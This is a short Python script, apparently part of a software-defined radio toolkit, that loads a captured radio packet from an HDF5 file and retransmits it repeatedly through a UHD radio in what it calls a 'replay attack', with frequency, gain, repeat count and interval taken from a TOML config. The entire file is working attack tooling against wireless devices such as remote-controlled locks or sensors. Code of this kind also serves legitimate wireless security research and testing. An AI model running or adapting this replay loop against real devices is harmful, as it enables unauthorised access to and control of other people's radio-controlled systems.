import os, sys
from time import sleep, time
import numpy as np

from tomlkit.toml_file import TOMLFile
from tomlkit.toml_document import TOMLDocument

FILE_DIR = os.path.dirname(os.path.realpath(__file__))
sys.path.insert(0, FILE_DIR)

from helper_functions.uhd_interface import SDR
from helper_functions.hdf5_handler import HDF5Handler
from helper_functions.plot_signal import plot_signal


class Attack:
    settings: TOMLDocument = TOMLFile("config.toml").read()
    hdf5: HDF5Handler = HDF5Handler()

    def __init__(self):
        """ Controls the replay attack. """
        self.toml_radio: dict = self.settings.get("RADIO")
        self.toml_attack: dict = self.settings.get("ATTACK")
        # RADIO
        self.center_freq: float = self.toml_radio["center_freq"]
        self.sample_rate: float = self.toml_radio["sample_rate"]
        self.rx_gain: int = self.toml_radio["rx_gain"]
        self.tx_gain: int = self.toml_radio["tx_gain"]
        self.uhd_id: str = self.toml_radio["uhd_id"]
        # ATTACK
        self.file: str = self.toml_attack["file"]
        self.dataset: str = self.toml_attack["dataset"]
        self.repeat: int = self.toml_attack["repeat"]
        self.interval: float = self.toml_attack["interval"]

    def replay(self):
        """ Replays a captured packet. """
        count: int = 0
        heartbeat: int = 0
        self.sdr: SDR = SDR(self.sample_rate, self.center_freq, self.tx_gain, self.rx_gain)
        self.packet: np.ndarray = self.hdf5.get_signal(self.file, self.dataset)
        plot_signal(self.packet, self.sample_rate, 0.25)
        print("STARTING REPLAY ATTACK")
        timer = time()
        while True:
            print(time() - timer)
            self.sdr.tx_data(self.packet)
            timer = time()
            heartbeat += 1
            if heartbeat > 5:
                print("ATTACK MODE STILL ALIVE")
            if self.repeat > 0:
                count += 1
                if count > self.repeat:
                    break
            sleep(self.interval)
        print("EXITING REPLAY ATTACK")
